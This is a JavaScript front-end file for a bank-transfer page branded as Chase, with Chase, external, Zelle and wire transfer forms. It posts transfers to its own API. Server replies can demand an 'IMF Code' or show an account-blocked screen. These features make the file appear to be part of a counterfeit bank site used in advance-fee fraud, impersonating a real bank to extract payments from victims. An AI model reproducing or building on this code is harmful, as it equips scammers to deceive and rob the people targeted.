let transferData = {};

document.addEventListener('DOMContentLoaded', () => {
    if (!localStorage.getItem('chase_user_id')) window.location.href = 'login.html';
});

function closeModals() {
    document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
}

function openTransfer(type) {
    const modal = document.getElementById('transferModal');
    const title = document.getElementById('modalTitle');
    const container = document.getElementById('dynamicFields');
    
    container.innerHTML = '';
    document.getElementById('txAmount').value = '';

    if (type === 'chase') {
        title.textContent = 'Transfer to Chase';
        container.innerHTML = `
            <div class="form-group"><label class="form-label">Recipient Name</label><input type="text" class="form-input" required></div>
            <div class="form-group"><label class="form-label">Account Number</label><input type="text" id="txRecipient" class="form-input" required></div>`;
    } else if (type === 'other') {
        title.textContent = 'External Transfer';
        container.innerHTML = `
            <div class="form-group"><label class="form-label">Bank Name</label><input type="text" class="form-input"></div>
            <div class="form-group"><label class="form-label">Account Name</label><input type="text" class="form-input"></div>
            <div class="form-group"><label class="form-label">Routing Number</label><input type="number" class="form-input"></div>
            <div class="form-group"><label class="form-label">Account Number</label><input type="text" id="txRecipient" class="form-input" required></div>`;
    } else if (type === 'zelle') {
        title.textContent = 'Zelle®';
        container.innerHTML = `
            <div class="form-group"><label class="form-label">Email or Mobile</label><input type="text" id="txRecipient" class="form-input" required></div>`;
    } else if (type === 'wire') {
        title.textContent = 'Wire Transfer';
        container.innerHTML = `
            <div class="form-group"><label class="form-label">Beneficiary Name</label><input type="text" id="txRecipient" class="form-input" required></div>
            <div class="form-group"><label class="form-label">Bank Name</label><input type="text" class="form-input"></div>
            <div class="form-group"><label class="form-label">Bank Address</label><input type="text" class="form-input"></div>
            <div class="form-group"><label class="form-label">SWIFT / IBAN</label><input type="text" class="form-input"></div>`;
    }

    modal.style.display = 'block';
}

document.getElementById('transferForm').addEventListener('submit', (e) => {
    e.preventDefault();
    const amount = document.getElementById('txAmount').value;
    // We assume the input with id="txRecipient" is the primary identifier
    const recipientInput = document.getElementById('txRecipient');
    const recipient = recipientInput ? recipientInput.value : 'Recipient';

    if (!amount || amount <= 0) {
        alert('Please enter a valid amount.');
        return;
    }

    transferData = { amount, recipient };
    initiateTransfer(); 
});

async function initiateTransfer(authCode = null) {
    const userId = localStorage.getItem('chase_user_id');
    
    const payload = {
        userId,
        amount: transferData.amount,
        recipient: transferData.recipient,
        imfCode: authCode
    };

    try {
        const res = await fetch('/api/transfer', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        const result = await res.json();

        if (result.success) {
            showReceipt(result.receipt);
        } else if (result.errorType === 'AUTH_REQUIRED') {
            document.getElementById('transferModal').style.display = 'none';
            document.getElementById('authNameDisplay').textContent = result.authName || 'IMF Code';
            document.getElementById('authModal').style.display = 'block';
        } else if (result.errorType === 'BLOCK') {
            // SHOW THE NEW BLOCKED MODAL
            document.getElementById('transferModal').style.display = 'none';
            document.getElementById('blockedModal').style.display = 'block';
        } else {
            alert(result.message);
        }

    } catch (err) {
        alert('Connection Error');
    }
}

function submitAuthCode() {
    const code = document.getElementById('imfCodeInput').value;
    if(!code) return alert('Enter code');
    initiateTransfer(code);
}

function showReceipt(receipt) {
    closeModals();
    document.getElementById('recAmount').textContent = `$${parseFloat(receipt.amount).toFixed(2)}`;
    document.getElementById('recRecipient').textContent = receipt.recipient;
    document.getElementById('recDate').textContent = receipt.date;
    document.getElementById('recRef').textContent = receipt.ref;
    
    document.getElementById('receiptModal').style.display = 'block';
}


